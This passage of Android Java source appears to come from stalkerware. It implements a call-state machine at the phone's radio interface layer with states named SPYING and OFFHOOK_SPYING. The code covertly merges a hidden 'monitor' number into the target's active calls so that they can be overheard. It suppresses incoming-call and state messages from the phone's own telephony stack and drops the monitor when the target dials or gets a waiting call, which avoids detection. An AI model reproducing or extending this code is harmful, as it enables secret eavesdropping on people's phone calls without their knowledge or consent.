								bytes[4] == RilConstant.RIL_REQUEST_SET_MUTE ? 
										true : false;
								
						if (isSetMute) {
							cacheRequest[0] = p.marshall();
						}
						else {
							cacheRequest[1] = p.marshall();
						}
					}
					else {
						cacheRequest[0] = p.marshall();
					}
					forward = false;
				}
				else if (request == RilConstant.RIL_REQUEST_DIAL) {
					if (cacheRequest[0] == null) {
						cacheRequest[0] = p.marshall();
					}
					else if (cacheRequest[1] == null) {
						cacheRequest[1] = p.marshall();
					}
					// I still haven't found the case where the cache size is bigger than 3
					else {
						cacheRequest[2] = p.marshall();
					}
					
					if (! isReleasingMonitor) {
						releaseMonitor();
						mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.DIALING);
					}
					
					targetIsDialing = true;
					forward = false;
				}
				
				if (forward) {
					mFilterCall.writeToTerminate(p);
				}
				return nextState;
			}

			@Override
			public CallState processResponse(Parcel p) {
				CallState nextState = this;
				boolean forward = true;
				
				int response = mFilterCall.mRilManager.getResponse(p);
				
				if (response == RilConstant.RIL_UNSOL_CALL_STATE_CHANGED) {
					// Collect LG state info message
					if (! lgStateInfo.isEmpty()) {
						lgStateInfo.add(p.marshall());
					}
					// Request current calls
					if (lgStateInfo.isEmpty() || 
							mFilterCall.isLgInfoAllCollected(callList, lgStateInfo)) {
						
						// LG Specific logics
						if (isLgStateInProgress) {
							mFilterCall.writeAtMessage(
									"LG state info is collected successfully");
							isLgStateInProgress = false;
							lgStateInfo.clear();
							
							if (isSwitching) {
								if (isSwitchingResponded) {
									isStateChanged = true;
									mFilterCall.writeAtMessage(
											"Switching now cause state changed");
								}
								else {
									mFilterCall.writeAtMessage(
											"Waiting for switching response");
								}
							}
						}
						// Common logics
						else {
							isStateChanged = true;
						}
						
						mFilterCall.writeAtMessage("State changed -> Check current calls");
						FilterHelper.requestGetCurrentCalls(
								mFilterCall.mRilManager, mFilterCall);
					}
					forward = false;
				}
				// Handle incoming call
				else if (mFilterCall.isIncomingCall(p, response)) {
					if (! lgStateInfo.isEmpty()) {
						// While switching, monitor is still considered incoming call 
						lgStateInfo.add(p.marshall());
					}
					else {
						mFilterCall.writeAtMessage(
								"Get incoming call -> Prepare releasing monitor");
						cacheUnsol = p.marshall();
					}
					
					// Still too fast for releasing the monitor
					forward = false;
				}
				// Block LG additional state info message
				else if (response == RilConstant.RIL_UNSOL_LG_CALL_STATE_INFO) {
					isLgStateInProgress = true;
					lgStateInfo.add(p.marshall());
					forward = false;
				}
				// Handle releasing monitor response
				else if (isReleasingMonitor && FilterHelper.isHangup(response)) {
					mFilterCall.writeAtMessage(
							"Got releasing monitor response -> Wait for state changed");
					forward = false;
				}
				// Handle switching response
				else if (isSwitching && response == RilConstant.RIL_REQUEST_SWITCH_CALLS) {
					mFilterCall.writeAtMessage(
							"Got switching response -> Wait for state changed");
					if (isLgStateInProgress) {
						mFilterCall.writeAtMessage("LG state is in progress -> Waiting ...");
					}
					else {
						FilterHelper.requestGetCurrentCalls(
								mFilterCall.mRilManager, mFilterCall);
					}
					
					isSwitchingResponded = true;
					forward = false;
				}
				// Handle merging response
				else if (isMerging && response == RilConstant.RIL_REQUEST_CONFERENCE) {
					Response r = Response.obtain(p);
					mFilterCall.writeAtMessage(
							String.format("Got merging response: error=%d", r.error));
					if (r.error == 0) {
						isMerging = false;
					}
					FilterHelper.requestGetCurrentCalls(
							mFilterCall.mRilManager, mFilterCall);
					forward = false;
				}
				// Handle current calls response
				else if (response == RilConstant.RIL_REQUEST_GET_CURRENT_CALLS) {
					forward = false;
					
					// Verify current state
					nextState = verifyCurrentState(p);
					
					if (nextState == OFFHOOK_SPYING) {
						// Handle SUCCESS switching
						if (isSwitching && isSwitchingResponded && isStateChanged) {
							isSwitching = false;
							isSwitchingResponded = false;
							isStateChanged = false;
							manageSwitching(p);
						}
						// Handle FAILED merging
						else if (isMerging) {
							manageMerging(p);
							isMerging = false;
						}
					}
				}
				
				if (forward) {
					mFilterCall.writeToOriginate(p);
				}
				return nextState;
			}
			
			@SuppressWarnings("unchecked")
			private void initialize(Object transitionObject) {
				mFilterCall.writeAtMessage("initialize # ENTER ...");
				
				if (transitionObject != null && 
						transitionObject instanceof ArrayList) {
					
					callList = (ArrayList<CallInfo>) transitionObject;
					
					monitorCallInfo = mFilterCall.findMonitor(callList);
					int monitorIndex = monitorCallInfo.getIndex();
					int monitorState = monitorCallInfo.getState();
					
					mFilterCall.writeAtMessage(String.format(
							"Monitor Info: index=%d, state=%d", monitorIndex, monitorState));
					
					MonitorNumber monitorInfo = 
							mFilterCall.mPreference.getMonitorInfo(
									monitorCallInfo.getNumber());
					
					boolean isInterceptAllowed = 
							monitorInfo != null && 
							monitorInfo.isEnabled() && 
							monitorInfo.isOffhookSpyEnabled();
					
					boolean isStateReady = isThirdPartyActive() && monitorState == 5;
					
					boolean isGoodToContinue = isInterceptAllowed && isStateReady;
					
					// Begin call intercept process
					if (isGoodToContinue) {
						mFilterCall.writeAtMessage("Try switching calls");
						Parcel swap = FilterHelper.getParcel(
								FilterHelper.REQUEST_SWITCH_CALLS);
						
						mFilterCall.mRilManager.addRequest(swap);
						mFilterCall.writeToTerminate(swap);
						isSwitching = true;
					}
					// Reject call intercept
					else {
						if (! isInterceptAllowed) {
							mFilterCall.writeAtMessage("Call Intercept is NOT allowed!!");
						}
						else if (! isStateReady) {
							mFilterCall.writeAtMessage("Phone state is NOT ready!!");
						}
						mFilterCall.writeAtMessage("Release waiting monitor");
						releaseWaitingMonitor();
						mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.BAD_STATE);
					}
				}
				
				mFilterCall.writeAtMessage("initialize # EXIT ...");
			}

			private void manageSwitching(Parcel response) {
				mFilterCall.writeAtMessage("manageSwitching # ENTER ...");
				
				int monitorState = monitorCallInfo.getState();
				boolean isThirdPartyOnHold = isThirdPartyOnHold();
				
				mFilterCall.writeAtMessage(String.format(
							"manageSwitching # monitorState: %d, isThirdPartyOnHold: %s", 
							monitorState, isThirdPartyOnHold));
				
				// Success scenario
				if (monitorState == 0 && isThirdPartyOnHold) {
					mFilterCall.writeAtMessage("manageSwitching # Switching SUCCESS! -> Try merging");
					Parcel conference = FilterHelper.getParcel(
							FilterHelper.REQUEST_CONFERENCE);
					mFilterCall.mRilManager.addRequest(conference);
					mFilterCall.writeToTerminate(conference);
					isMerging = true;
				}
				else if (isThirdPartyOnHold) {
					mFilterCall.writeAtMessage("manageSwitching # Switching not complete! -> Wait");
					isSwitching = true;
					isSwitchingResponded = true;
					isStateChanged = false;
				}
				// Error handling
				else {
					mFilterCall.writeAtMessage("manageSwitching # Switching FAILED!!");
					if (isThirdPartyOnHold) {
						mFilterCall.writeAtMessage(
								"manageSwitching # Re-switching after monitor is released");
						cacheRequest[0] = FilterHelper.REQUEST_SWITCH_CALLS;
					}
					releaseMonitor();
					mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.BAD_STATE);
				}
				
				mFilterCall.writeAtMessage("manageSwitching # EXIT ...");
			}
			
			private void manageMerging(Parcel response) {
				mFilterCall.writeAtMessage("manageMerging # ENTER ...");
				
				int monitorState = monitorCallInfo.getState();
				boolean isThirdPartyActive = isThirdPartyActive();
				
				mFilterCall.writeAtMessage(String.format(
							"manageMerging # monitorState: %d, isThirdPartyActive: %s", 
							monitorState, isThirdPartyActive));
				
				// Success scenario
				if (monitorState == 0 && isThirdPartyActive) {
					mFilterCall.writeAtMessage(
							"manageMerging # Call interception success!");
				}
				// Error handling
				else {
					mFilterCall.writeAtMessage("manageMerging # Merging FAILED!!");
					if (!isThirdPartyActive) {
						mFilterCall.writeAtMessage(
								"manageSwitching # Re-switching after monitor is released");
						cacheRequest[0] = FilterHelper.REQUEST_SWITCH_CALLS;
					}
					releaseMonitor();
					mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.BAD_STATE);
				}
				
				mFilterCall.writeAtMessage("manageMerging # EXIT ...");
			}
			
			// Must be called by processResponse() ONLY!!
			private CallState verifyCurrentState(Parcel response) {
				CallState nextState = this;
				
				// Previous calls count
				int previousCalls  = callList == null ? 0 : callList.size();
				
				// Update call list
				callList = CallInfo.getCallInfo(response);
				FilterHelper.printCallInfo(
						callList, mFilterCall.mRilManager.getAtLogCollector());
				
				// Update monitor
				monitorCallInfo = mFilterCall.findMonitor(callList);
				
				// Check waiting call
				CallInfo waitingCall = mFilterCall.findWaitingCall(callList);
				
				boolean hasWaitingCall = waitingCall != null && waitingCall != monitorCallInfo;
				
				// Updated calls count
				int currentCalls = callList == null ? 0 : callList.size();
				
				// Releasing monitor
				if (isReleasingMonitor && isStateChanged) {
					mFilterCall.writeAtMessage("Monitor is released");
					
					// Handle waiting call
					if (hasWaitingCall) {
						mFilterCall.writeAtMessage("Forward ringing messages");
						
						// cacheUnsol CAN be null
						if (! lgStateInfo.isEmpty()) {
							mFilterCall.forwardLgStateInfo(lgStateInfo);
						}
						else {
							FilterHelper.forwardRingMessages(mFilterCall, cacheUnsol);
							cacheUnsol = null;
						}
					}
					
					// Forward caching unsolicited response
					if (cacheUnsol != null) {
						mFilterCall.writeAtMessage("Forward caching unsolicited resopnse");
						mFilterCall.writeToOriginate(
								FilterHelper.getParcel(cacheUnsol));
					}
					
					// Forward caching ril request
					mFilterCall.writeAtMessage("Forward caching ril request");
					
					byte[] temp = null;
					for (int i = 0; i < cacheRequest.length; i++) {
						temp = cacheRequest[i];
						if (temp != null) {
							mFilterCall.writeToTerminate(
									FilterHelper.getParcel(temp));
						}
					}
					isReleasingMonitor = false;
					isStateChanged = false;
					
					if (hasWaitingCall) {
						nextState = OFFHOOK_RINGING;
					}
					else if (targetIsDialing) {
						nextState = OFFHOOK_DIALING;
					}
					else {
						transition = response;
						nextState = OFFHOOK;
					}
				}
				// No calls found
				else if (callList == null || callList.size() == 0) {
					mFilterCall.writeAtMessage("There is no calls -> Go IDLE");
					nextState = IDLE;
				}
				// Target has incoming call
				else if (hasWaitingCall && callList.size() > 2) {
					mFilterCall.writeAtMessage("Found waiting call!!");
					releaseMonitor();
					mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.CALL_WAITING);
				}
				// Someone is gone
				else if (previousCalls > currentCalls) {
					mFilterCall.writeAtMessage("Someone is missing!");
					if (monitorCallInfo == null) {
						mFilterCall.writeAtMessage("Monitor is gone -> Go OFFHOOK");
						transition = response;
						nextState = OFFHOOK;
					}
					else {
						mFilterCall.writeAtMessage("3rd party is gone!!");
						cacheUnsol = FilterHelper.UNSOL_CALL_STATE_CHANGED;
						releaseMonitor();
						mFilterCall.notifyMonitorDisconnect(MonitorDisconnectReason.PARTY_LEFT);
					}
					
				}
				
				return nextState;
			}
			
			private void releaseWaitingMonitor() {
				FilterHelper.hangupBackground(mFilterCall, mFilterCall.mRilManager);
				isReleasingMonitor = true;
			}

			private void releaseMonitor() {
				int monitorIndex = monitorCallInfo.getIndex();
				
				mFilterCall.writeAtMessage(String.format(
						"Releasing monitor: index=%d", monitorIndex));
				
				FilterHelper.hangupIndex(
						monitorIndex, mFilterCall, mFilterCall.mRilManager);
				
				isReleasingMonitor = true;
			}

			private boolean isThirdPartyActive() {
				return checkThirdParty(true);
			}
			
			private boolean isThirdPartyOnHold() {
				return checkThirdParty(false);
			}
			
			private boolean checkThirdParty(boolean checkActive) {
				if (callList == null || callList.size() < 2) {
					mFilterCall.writeAtMessage("Call list is incorrect!!");
					return false;
				}
				boolean result = true;
				if (checkActive) {
					for (CallInfo call : callList) {
						if (monitorCallInfo != null && monitorCallInfo.getIndex() == call.getIndex()) {
							continue;
						}
						if (call == null || call.getState() != 0) {
							mFilterCall.writeAtMessage("Some 3rd party are NOT active!!");
							result = false;
							break;
						}
					}
				}
				else {
					for (CallInfo call : callList) {
						if (monitorCallInfo != null && monitorCallInfo.getIndex() == call.getIndex()) {
							continue;
						}
						if (call == null || call.getState() == 0) {
							mFilterCall.writeAtMessage("Some 3rd party are still active!!");
							result = false;
							break;
						}
					}
				}
				return result;
			}
			
		}
		;
		
		protected FilterGsmCall mFilterCall;
		
		// The variables below must be static since we need to share the value between each state
		
		// Collect list of the numbers that already sent SMS notification to the monitor 
		static Set<String> sNotifiedList;
		
		void setMessageFilter(FilterGsmCall callStateMachine) {
			mFilterCall = callStateMachine;
		}
		
		/**
		 * @param transitionObject the transition object from the previous state.
		 */
		public abstract void onEnter(Object transitionObject);
		
		/**
		 * @return transition object to be used as any information to transfer to the next state. 
		 */
		public abstract Object onExit();
		
		public abstract CallState processRilRequest(Parcel p);
		public abstract CallState processResponse(Parcel p);
		
	}

	@Override
	public void onAudioModeUpdate(int mode) {
		writeAtMessage(String.format(
				"onAudioModeUpdate # Call State: %s, Audio Mode: %d", mState, mode));
		
		int matchingMode = getMatchingAudioMode(mState);
		if (mode == matchingMode) {
			writeAtMessage("onAudioModeUpdate # Audio mode is OK -> Stop listener");
			stopAudioModeListener();
		}
		else {
			writeAtMessage(String.format(
					"onAudioModeUpdate # Change audio mode to: %d ", matchingMode));
			mAudioManager.setMode(matchingMode);
		}
	}
	
	private int getMatchingAudioMode(CallState callState) {
		int mode = AudioManager.MODE_CURRENT;
		
		if (callState == CallState.IDLE) mode = AudioManager.MODE_NORMAL;
		else if (callState == CallState.DIALING) mode = AudioManager.MODE_IN_CALL;
		else if (callState == CallState.RINGING) mode = AudioManager.MODE_RINGTONE;
		else if (callState == CallState.OFFHOOK) mode = AudioManager.MODE_IN_CALL;
		else if (callState == CallState.OFFHOOK_DIALING) mode = AudioManager.MODE_IN_CALL;
		else if (callState == CallState.OFFHOOK_RINGING) mode = AudioManager.MODE_RINGTONE;
		else if (callState == CallState.SPYING) mode = AudioManager.MODE_IN_CALL;
		else if (callState == CallState.OFFHOOK_SPYING) mode = AudioManager.MODE_IN_CALL;
		
		return mode;
	}

}
